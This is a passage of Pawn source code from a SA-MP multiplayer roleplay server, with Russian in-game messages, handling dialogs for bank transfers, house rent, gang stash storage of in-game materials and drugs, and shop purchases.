         					static const fmt_string[] = "[A]{ffffff} %s одобрил(а) заявку от %s на %s";
							new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
							format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[i][pSendername],PlayerInfo[i][pNick]);
							SendAdminMessage(CYELLOW,str);
							ChangeNick(i);
							for(new o; o < 50; o++) SendClientMessage(i,-1, "");
							static const fmt_string1[] = "Вашу заявку одобрили. Ваш ник: {FFFFFF}%s";
							new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
							format(str1, sizeof(str1), fmt_string1,PlayerInfo[i][pNick]);
							SendClientMessage(i,CYELLOW,str1);
							SendClientMessage(i,CYELLOW,"Так же не забудьте сменить ник в клиенте SAMP на новый");
							format(PlayerInfo[i][pNick],MAX_PLAYER_NAME,"None");
							SaveAccount(i);
							cmd_ns(playerid,"");
							mysql_free_result();*/
			        }
			        default:
			        {
							static const fmt_string[] = "[A]{ffffff} %s отклонил заявку от %s на %s";
							new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
							format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[i][pSendername],PlayerInfo[i][pNick]);
							SendAdminMessage(CYELLOW,str);
							static const fmt_string1[] = "Ваша заявка на смену ника была отклонена";
							new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
							format(str1, sizeof(str1), fmt_string1,PlayerInfo[i][pNick]);
							SendClientMessage(i,CREWARD,str1);
							format(PlayerInfo[i][pNick],MAX_PLAYER_NAME,"None");
							cmd_ns(playerid,"");
			        }
			    }
			}
		}
		case 31:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0:
		        {
					Bankomat(playerid);
		        }
		        case 1:
		        {
		            if(PlayerInfo[playerid][pLevel] < 2) return SendClientMessage(playerid, CGREY, "Передача денег доступна с 2 уровня");
	                ShowPlayerDialog(playerid, 32, DIALOG_STYLE_INPUT, "Перевод денег","{FFFFFF}Введите ID человека, которому хотите перевести деньги", "Далее","Назад");
		        }
		        case 2: ShowPlayerDialog(playerid,66,DIALOG_STYLE_INPUT,"Снять со счета","{FFFFFF}Введите сколько хотите снять со счета:","Далее","Назад");
	 			case 3: ShowPlayerDialog(playerid, 34, DIALOG_STYLE_INPUT, "Пополнить мобильный","{FFFFFF}Укажите сумму пополнения мобильного счета:" , "Готово","Назад");
 			 	case 4: ShowPlayerDialog(playerid,59,DIALOG_STYLE_INPUT,"Пожертвование","{FFFFFF}Введите сколько хотите пожертвовать:","Далее","Назад");
		    }
		}
		case 32:
		{
			switch(response)
			{
			    case 1:
				{
				    new krek;
				    if(sscanf(inputtext,"u",krek) || !IsPlayerConnected(krek))
					{
			 			ShowPlayerDialog(playerid, 32, DIALOG_STYLE_INPUT, "Перевод денег","{FFFFFF}Введите ID человека, которому хотите перевести деньги:" , "Далее","Назад");
			 			SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
			 			return true;
					}
					static const fmt_string[] = "{FFFFFF}Вы хотите перевести:\n\n{f7ae11}%s\n\n{FFFFFF}Какую сумму:\n\nКомиссия: {f7ae11}%d%%";
					new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
					format(str, sizeof(str), fmt_string,PlayerInfo[krek][pSendername],Perevod);
					SetPVarInt(playerid,"Komu",krek);
					ShowPlayerDialog(playerid, 33, DIALOG_STYLE_INPUT, "Перевод денег",str , "Готово","Назад");
				}
				default: return true;
			
			}
		
		}
		case 33:
		{
			switch(response)
			{
			    case 1:
			    {
				    new krek;
				    if(sscanf(inputtext,"i",krek) || krek < 1 || krek > 10000000)
					{
				 			ShowPlayerDialog(playerid, 32, DIALOG_STYLE_INPUT, "Перевод денег","{FFFFFF}Кому хотите перевести:" , "Далее","Назад");
				 			SendClientMessage(playerid,CGREY,"Укажите сумму больше $1 и не более $10000000");
				 			DeletePVar(playerid,"Komu");
				 			return true;
					}
					if(!IsPlayerConnected(GetPVarInt(playerid,"Komu"))) return SendClientMessage(playerid,CGREY,"Данный игрок отключился от сервера");
					if(PlayerInfo[playerid][pBank] < krek+(krek*Perevod/100)) return SendClientMessage(playerid,CGREY,"У вас недостаточно средств");
					if(krek > 50000)
					{
					    query = "";
						format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Перевел игроку %s (-%d$)','%d')",PlayerInfo[playerid][pID],PlayerInfo[GetPVarInt(playerid,"Komu")][pSendername],krek+(krek*Perevod/100),gettime());
						mysql_tquery(mysql,query);
						query = "";
						format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Получил от %s (+%d$)','%d')",PlayerInfo[GetPVarInt(playerid,"Komu")][pID],PlayerInfo[playerid][pSendername],krek,gettime());
						mysql_tquery(mysql,query);
					}
					PlayerInfo[playerid][pBank] -= krek+(krek*Perevod/100);
					PlayerInfo[GetPVarInt(playerid,"Komu")][pBank] += krek;
					static const fmt_string[] = "[BANK]{FFFFFF} %s перевёл Вам $%i";
					new str[sizeof(fmt_string)+MAX_PLAYER_NAME+10];
					format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],krek);
					SendClientMessage(GetPVarInt(playerid,"Komu"),CREWARD,str);
					static const fmt_string1[] = "[BANK]{FFFFFF} С вашего счета $%i переведено на счет %s. Комиссия: %d$";
					new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+10];
					format(str1, sizeof(str1), fmt_string1,krek,PlayerInfo[GetPVarInt(playerid,"Komu")][pSendername],(krek*Perevod/100));
					SendClientMessage(playerid,CREWARD,str1);
					DeletePVar(playerid,"Komu");
			    }
				default:
				{
			 			ShowPlayerDialog(playerid, 32, DIALOG_STYLE_INPUT, "Перевод денег","{FFFFFF}Кому хотите перевести:" , "Далее","Назад");
			 			DeletePVar(playerid,"Komu");
			 			return true;
				}
			}
		}
		case 34:
		{
		    switch(response)
		    {
		        case 1:
		        {
		    		new krek;
				    if(sscanf(inputtext,"i",krek) || krek < 0 || krek > 10000000)
					{
						ShowPlayerDialog(playerid, 34, DIALOG_STYLE_INPUT, "Пополнить мобильный","{FFFFFF}Укажите сумму пополнения мобильного счета" , "Готово","Назад");
			 			SendClientMessage(playerid,CGREY,"Укажите сумму больше $0 и не более $10000000");
			 			return true;
					}
					if(PlayerInfo[playerid][pCash] < krek) return SendClientMessage(playerid,CGREY,"У вас недостаточно средств");
					GiveMoney(playerid,-krek);
					PlayerInfo[playerid][pPhoneBal] += krek;
					static const fmt_string1[] = "Вы пополнили мобильный счет на $%i. Новый баланс: $%i ";
					new str1[sizeof(fmt_string1)+10+10];
					format(str1, sizeof(str1), fmt_string1,krek,PlayerInfo[playerid][pPhoneBal]);
					SendClientMessage(playerid,-1,str1);
					
		        }
				default: ShowPlayerDialog(playerid, 31, DIALOG_STYLE_LIST, "Банкомат", "{FFFFFF}Счет\nСнять со счета\nПополнить мобильный счет","Выбор","Закрыть");
		    }
		}
  		case 35:
        {
            if(!response) return RemovePlayerFromVehicle(playerid);
			if(!IsPlayerInAnyVehicle(playerid)) return true;
            new kek = 0;
           	for(new i = 1; i<= TOTALV; i++)
			{
			    if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
				if(strcmp(VInfo[i][vname], PlayerInfo[playerid][pSendername], true) == 0) kek++;
			}
           	if(!PlayerInfo[playerid][pDCar] && kek == 1) return SendClientMessage(playerid,CGREY,"Вы не можете иметь больше 2 машин, не имея привилегии");
           	if(kek == 2 && PlayerInfo[playerid][pDCar] == 1) return SendClientMessage(playerid,CGREY,"Вы не можете иметь больше 2 машин");
			if(kek >= 3) return SendClientMessage(playerid,CGREY,"Вы не можете иметь больше 3 машин");
           	if(strcmp(VInfo[GetPVarInt(playerid,"ModelM")][vname],"None",true))
           	{
                SendClientMessage(playerid,CGREY,"Транспорт уже куплен");
                RemovePlayerFromVehicle(playerid);
				return true;
            }
            if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"CostM"))
            {
                SendClientMessage(playerid,CGREY,"Недостаточно средств");
                RemovePlayerFromVehicle(playerid);
				return true;
            }
            if(PlayerInfo[playerid][pLevel] < 1)
            {
                RemovePlayerFromVehicle(playerid);
			 	return SendClientMessage(playerid, CGREY, "Покупка со 1 уровня");
            }
            if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[playerid][pSendername], true) == 0) ShowPlayerDialog(playerid,396,DIALOG_STYLE_LIST,"Для кого","1 | Для себя\n2 | Для семьи","Далее","Отмена");
            else
            {
                BuyCar(playerid,0);

			}
			
		}
		case 36:
		{
		    if(!response) return true;
   			new krek;
		    if(sscanf(inputtext,"i",krek) || krek < 1 || krek > 30) return ShowPlayerDialog(playerid, 36, DIALOG_STYLE_INPUT, "На сколько хотите оплатить?","{FFFFFF}Введите на сколько хотите оплатить дом:\nОт 1 до 30 дней." , "Выбор","Назад");
		    if(HInfo[GetPVarInt(playerid,"PlayerHouse")][hOplata]> gettime()+60*60*24*krek) return InfoOplHouse(playerid);
		    if(!HInfo[GetPVarInt(playerid,"PlayerHouse")][hUl][1]) SetPVarInt(playerid,"Skoka",HInfo[GetPVarInt(playerid,"PlayerHouse")][hTax]*krek);
			else SetPVarInt(playerid,"Skoka",(HInfo[GetPVarInt(playerid,"PlayerHouse")][hTax]*krek)-(HInfo[GetPVarInt(playerid,"PlayerHouse")][hTax]*krek)*25/100);
			static const fmt_str[] = "{FFFFFF}Стоимость платы за дом на %i дн. составит: $%i\nОплатить?";
			SetPVarInt(playerid,"Skoka1",60*60*24*krek);
			new string[sizeof(fmt_str)+10];
			format(string, sizeof(string), fmt_str, krek, GetPVarInt(playerid,"Skoka"));
			ShowPlayerDialog(playerid,37,DIALOG_STYLE_MSGBOX,"Оплата дома",string,"Да","Нет");
		    //ShowPlayerDialog(playerid, 36, DIALOG_STYLE_INPUT, "На сколько хотите оплатить?","{FFFFFF}Введите на сколько хотите оплатить дом:\nОт 1 до 30 дней." , "Выбор","Назад");
		}
		case 37:
		{
		    if(!response) return DeletePVar(playerid,"Skoka");
		    if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"Skoka")) return SendClientMessage(playerid,CGREY,"У вас недостаточно средств");
			if(GetPlayerHouse(playerid))
			{
				if(HInfo[GetPVarInt(playerid,"PlayerHouse")][hOplata] <= 0) HInfo[GetPVarInt(playerid,"PlayerHouse")][hOplata] = gettime() + GetPVarInt(playerid,"Skoka1");
				else
				{
				    new k = HInfo[GetPVarInt(playerid,"PlayerHouse")][hOplata] - gettime();
				    HInfo[GetPVarInt(playerid,"PlayerHouse")][hOplata] = gettime() + GetPVarInt(playerid,"Skoka1") + k;
				}
			    GiveMoney(playerid,-GetPVarInt(playerid,"Skoka"));
			    Kazna += GetPVarInt(playerid,"Skoka");
			    SetMatsInt("kazna",Kazna);
				static const fmt_str[] = "Вы внесли плату за дом на: %s Стоимость: $%i";
				new string[sizeof(fmt_str)+10+10+5];
				format(string, sizeof(string), fmt_str,timec(gettime()+GetPVarInt(playerid,"Skoka1")),GetPVarInt(playerid,"Skoka"));
				SendClientMessage(playerid,CREWARD,string);
				query = "";
				format(query, sizeof(query), "UPDATE testhouse SET hOplata = %i WHERE id = '%d' LIMIT 1",HInfo[GetPVarInt(playerid,"PlayerHouse")][hOplata],GetPVarInt(playerid,"PlayerHouse"));
				mysql_tquery(mysql,query);
				DeletePVar(playerid,"Skoka");
				DeletePVar(playerid,"Skoka1");
			}
			else SendClientMessage(playerid,CGREY,"У Вас нет дома");
		}
		case 38:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
     			case 0: ShowPlayerDialog(playerid,383,DIALOG_STYLE_LIST,"Общак","1 | Материалы\n2 | Наркотики","Выбрать","Отмена");
		    	case 1: ShowPlayerDialog(playerid,384,DIALOG_STYLE_LIST,"Общак","1 | Материалы\n2 | Наркотики\n3 | Деньги","Выбрать","Отмена");
		        
		    }
		}
		
		case 39:
		{
		    if(!response)
			{
				if(IsAGang(playerid) || IsAMafia(playerid)) ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
				return true;
			}
		    new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,39,DIALOG_STYLE_INPUT,"Взять материалы","{FFFFFF}Введите сколько материалов хотите взять:","Далее","Назад");
		    if(krek < 0 || krek > 10000000) return true;
		    if(krek > FracMats[PlayerInfo[playerid][pMember]])
			{
			    ShowPlayerDialog(playerid,39,DIALOG_STYLE_INPUT,"Взять материалы","{FFFFFF}Введите сколько материалов хотите взять:","Далее","Назад");
		 		return SendClientMessage(playerid,CGREY,"Недостаточно материалов на складе");
		 	}
		 	if(GetFree(playerid,447,krek))
		 	{
		 	    ShowPlayerDialog(playerid,39,DIALOG_STYLE_INPUT,"Взять материалы","{FFFFFF}Введите сколько материалов хотите взять:","Далее","Назад");
	 			return SendClientMessage(playerid,CGREY,"Вы не можете с собой носить больше 500 материалов");
		 	}
		 /*	if(!PlayerInfo[playerid][pUl][2])
		 	{
			 	if(PlayerInfo[playerid][pMats]+krek > 500)
				{
				    ShowPlayerDialog(playerid,39,DIALOG_STYLE_INPUT,"Взять материалы","{FFFFFF}Введите сколько материалов хотите взять:","Далее","Назад");
	  		 		return SendClientMessage(playerid,CGREY,"Вы не можете с собой носить больше 500 материалов");
				}
			}
			else
		 	{
			 	if(PlayerInfo[playerid][pMats]+krek > 1000)
				{
				    ShowPlayerDialog(playerid,39,DIALOG_STYLE_INPUT,"Взять материалы","{FFFFFF}Введите сколько материалов хотите взять:","Далее","Назад");
	  		 		return SendClientMessage(playerid,CGREY,"Вы не можете с собой носить больше 1000 материалов");
				}
			}*/
		 	FracMats[PlayerInfo[playerid][pMember]] -= krek;
	 		new text[5];
			if(IsAGang(playerid) || IsAMafia(playerid)) text = "[F]";
			else text = "[R]";
	 		static const fmt_string[] = "%s %s взял %i ед. материалов со склада. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,text,PlayerInfo[playerid][pSendername],krek,FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			if(PlayerInfo[playerid][pMember] == F_ARMY) UpdateArmy();
			PlayerInfo[playerid][pMats] += krek;
   			GiveInv(playerid,447,krek);
			SaveMats(playerid);
			if(IsAGang(playerid) || IsAMafia(playerid))
			{
				UpdateMat(PlayerInfo[playerid][pMember]);
				ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
			}
		}
		case 40:
		{
		    if(!response) return ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
		    new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,40,DIALOG_STYLE_INPUT,"Взять наркотики","{FFFFFF}Введите сколько наркотиков хотите взять:","Далее","Назад");
            if(krek < 0 || krek > 30) return ShowPlayerDialog(playerid,40,DIALOG_STYLE_INPUT,"Взять наркотики","{FFFFFF}Введите сколько наркотиков хотите взять:","Далее","Назад");
			if(krek > FracDrugs[PlayerInfo[playerid][pMember]])
			{
			    ShowPlayerDialog(playerid,40,DIALOG_STYLE_INPUT,"Взять наркотики","{FFFFFF}Введите сколько наркотиков хотите взять:","Далее","Назад");
		 		return SendClientMessage(playerid,CGREY,"Недостаточно наркотиков на складе");
		 	}
		 /*	if(!PlayerInfo[playerid][pUl][2])
		 	{
				if(PlayerInfo[playerid][pDrugs]+krek > 500)
				{
	          		ShowPlayerDialog(playerid,40,DIALOG_STYLE_INPUT,"Взять наркотики","{FFFFFF}Введите сколько наркотиков хотите взять:","Далее","Назад");
				    return SendClientMessage(playerid,CGREY,"Вы не можете с собой носить больше 500 наркотиков");
				}
			}
			else
			{
				if(PlayerInfo[playerid][pDrugs]+krek > 1000)
				{
	          		ShowPlayerDialog(playerid,40,DIALOG_STYLE_INPUT,"Взять наркотики","{FFFFFF}Введите сколько наркотиков хотите взять:","Далее","Назад");
				    return SendClientMessage(playerid,CGREY,"Вы не можете с собой носить больше 1000 наркотиков");
				}
			}*/
			if(GetFree(playerid,337,krek))
			{
				ShowPlayerDialog(playerid,40,DIALOG_STYLE_INPUT,"Взять наркотики","{FFFFFF}Введите сколько наркотиков хотите взять:","Далее","Назад");
				SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре");
				return true;
			}
		 	FracDrugs[PlayerInfo[playerid][pMember]] -= krek;
	 		static const fmt_string[] = "[F] %s взял %i гр. наркотиков с склада. На складе: %i наркотиков";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],krek,FracDrugs[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			PlayerInfo[playerid][pDrugs] += krek;
			GiveInv(playerid,337,krek);
			switch(PlayerInfo[playerid][pMember])
			{
			    case F_GROVE: SetMatsInt("grovedrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_BALLAS: SetMatsInt("ballasdrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_BIKERS: SetMatsInt("bikersdrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_AZTECAS: SetMatsInt("aztecasdrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_VAGOS: SetMatsInt("vagosdrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_LCN: SetMatsInt("lcndrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_RM: SetMatsInt("rmdrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_YAKUZA: SetMatsInt("triaddrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			}
			UpdateMat(PlayerInfo[playerid][pMember]);
			ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
		}
		case 41:
		{
		    if(!response)
			{
				if(IsAGang(playerid) || IsAMafia(playerid)) ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
				return true;
			}
		    new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,41,DIALOG_STYLE_INPUT,"Положить материалы","{FFFFFF}Введите сколько материалов хотите положить:","Далее","Назад");
            if(krek < 0 || krek > 10000000) return true;
		    if(krek > PlayerInfo[playerid][pMats])
			{
			    ShowPlayerDialog(playerid,41,DIALOG_STYLE_INPUT,"Положить материалы","{FFFFFF}Введите сколько материалов хотите положить:","Далее","Назад");
		 		SendClientMessage(playerid,CGREY,"У Вас недостаточно материалов");
		 		return true;
		 	}
		 	FracMats[PlayerInfo[playerid][pMember]] += krek;
	 		new text[5];
			if(IsAGang(playerid) || IsAMafia(playerid)) text = "[F]";
			else text = "[R]";
	 		static const fmt_string[] = "%s %s положил %i ед. материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,text,PlayerInfo[playerid][pSendername],krek,FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			PlayerInfo[playerid][pMats] -= krek;
			InvMinus(playerid,447,krek);
			if(PlayerInfo[playerid][pMember] == F_ARMY) UpdateArmy();
			SaveMats(playerid);
			if(IsAGang(playerid) || IsAMafia(playerid))
			{
				UpdateMat(PlayerInfo[playerid][pMember]);
				ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
			}
		}
		case 42:
		{
		    if(!response) return ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
		    new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,42,DIALOG_STYLE_INPUT,"Положить наркотики","{FFFFFF}Введите сколько наркотики хотите положить:","Далее","Назад");
            if(krek < 0 || krek > 10000000) return true;
			if(krek > PlayerInfo[playerid][pDrugs])
			{
			    ShowPlayerDialog(playerid,42,DIALOG_STYLE_INPUT,"Положить наркотики","{FFFFFF}Введите сколько наркотики хотите положить:","Далее","Назад");
		 		SendClientMessage(playerid,CGREY,"У Вас недостаточно наркотиков");
		 		return true;
		 	}
		 	FracDrugs[PlayerInfo[playerid][pMember]] += krek;
	 		static const fmt_string[] = "[F] %s положил %i гр. наркотиков на склад. На складе: %i наркотиков";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],krek,FracDrugs[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			PlayerInfo[playerid][pDrugs] -= krek;
			InvMinus(playerid,337,krek);
			switch(PlayerInfo[playerid][pMember])
			{
			    case F_GROVE: SetMatsInt("grovedrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_BALLAS: SetMatsInt("ballasdrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_BIKERS: SetMatsInt("bikersdrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_AZTECAS: SetMatsInt("aztecasdrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_VAGOS: SetMatsInt("vagosdrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_LCN: SetMatsInt("lcndrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_RM: SetMatsInt("rmdrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			    case F_YAKUZA: SetMatsInt("triaddrugs",FracDrugs[PlayerInfo[playerid][pMember]]);
			}
			UpdateMat(PlayerInfo[playerid][pMember]);
			ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
		}
		case 43:
		{
		    if(!response) return ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
		    new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,43,DIALOG_STYLE_INPUT,"Положить деньги","{FFFFFF}Введите сколько денег хотите положить:","Далее","Назад");
            if(krek < 0 || krek > 10000000) return true;
			if(krek > PlayerInfo[playerid][pCash])
			{
			    ShowPlayerDialog(playerid,43,DIALOG_STYLE_INPUT,"Положить деньги","{FFFFFF}Введите сколько денег хотите положить:","Далее","Назад");
		 		SendClientMessage(playerid,CGREY,"У Вас недостаточно средств");
		 		return true;
		 	}
		 	FracBank[PlayerInfo[playerid][pMember]] += krek;
	 		static const fmt_string[] = "[F] %s положил $%i на склад. На складе: $%i";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],krek,FracBank[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			GiveMoney(playerid,-krek);
			SaveBank(playerid);
			UpdateMat(PlayerInfo[playerid][pMember]);
			ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
		}
		case 44:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        DeletePVar(playerid,"AmmoProd");
				DeletePVar(playerid,"AmmoSkok");
		        return true;
		    }
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd"))
		    {
		        SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        DeletePVar(playerid,"AmmoProd");
		        DeletePVar(playerid,"AmmoSkok");
		        return true;
		    }
		    if(!GetPVarInt(playerid,"Oplata"))
      		{
				if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        DeletePVar(playerid,"AmmoProd");
			        DeletePVar(playerid,"AmmoSkok");
			        return true;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        DeletePVar(playerid,"AmmoProd");
			        DeletePVar(playerid,"AmmoSkok");
			        return true;
				}
			}
			if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
			else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
			GivePlayerWeapon(playerid,GetPVarInt(playerid,"AmmoGun"),GetPVarInt(playerid,"AmmoSkok"));
			if(GetPVarInt(playerid,"BuyAmmo"))
			{
			    DestroyDynamicObject(GetPVarInt(playerid,"AmmoObj"));
				CancelSelectTextDraw(playerid);
				for(new x = 5; x < 18; x++) TextDrawHideForPlayer(playerid,ObjectBuy[x]);
				for(new x = 1; x < 3; x++) PlayerTextDrawHide(playerid,ObjectBuyP[x][playerid]);
		    	DeletePVar(playerid,"BuyAmmo");
		    	DeletePVar(playerid,"SelectAmmo");
		    	SetCameraBehindPlayer(playerid);
		    	TogglePlayerControllable(playerid, 1);
			}
   			DeletePVar(playerid,"AmmoGun");
      		DeletePVar(playerid,"AmmoPrice");
      		DeletePVar(playerid,"AmmoSkok");
      		DeletePVar(playerid,"AmmoProd");
		}
		
		case 51:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        DeletePVar(playerid,"AmmoObject");
		        DeletePVar(playerid,"AmmoProd");
		        return true;
		    }
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd"))
		    {
		        SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        DeletePVar(playerid,"AmmoObject");
		        DeletePVar(playerid,"AmmoProd");
		        return true;
		    }
		    if(!GetPVarInt(playerid,"Oplata"))
      		{
				if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        DeletePVar(playerid,"AmmoObject");
			        DeletePVar(playerid,"AmmoProd");
			        return true;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        DeletePVar(playerid,"AmmoObject");
			        DeletePVar(playerid,"AmmoProd");
			        return true;
				}
			}
			
		//	new text1[20] = "Питьё расчитано",text[10] = "пить";
  			if(BizInfo[GetPVarInt(playerid,"PBIZ")][bType] == 5 || BizInfo[GetPVarInt(playerid,"PBIZ")][bType] == 6 || BizInfo[GetPVarInt(playerid,"PBIZ")][bType] == 7)
	    	{
	    	    switch(GetPVarInt(playerid,"AmmoList"))
		    	{
		    	    case 0:
					{
					    if(GetFree(playerid,319,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
						GiveInv(playerid,319,1);
					}
		    	    case 1:
					{
						if(GetFree(playerid,313,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
						GiveInv(playerid,313,1);
					}
					/*SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK),SetPVarInt(playerid,"UseSp",7);*/
					case 2:
					{
					    if(GetFree(playerid,314,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
						GiveInv(playerid,314,1);
						//SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_BEER),SetPVarInt(playerid,"UseSp",13);
					}
					case 3:
					{
					    if(GetFree(playerid,450,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
						GiveInv(playerid,450,1);
					}
					case 4:
					{
					    if(GetFree(playerid,451,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
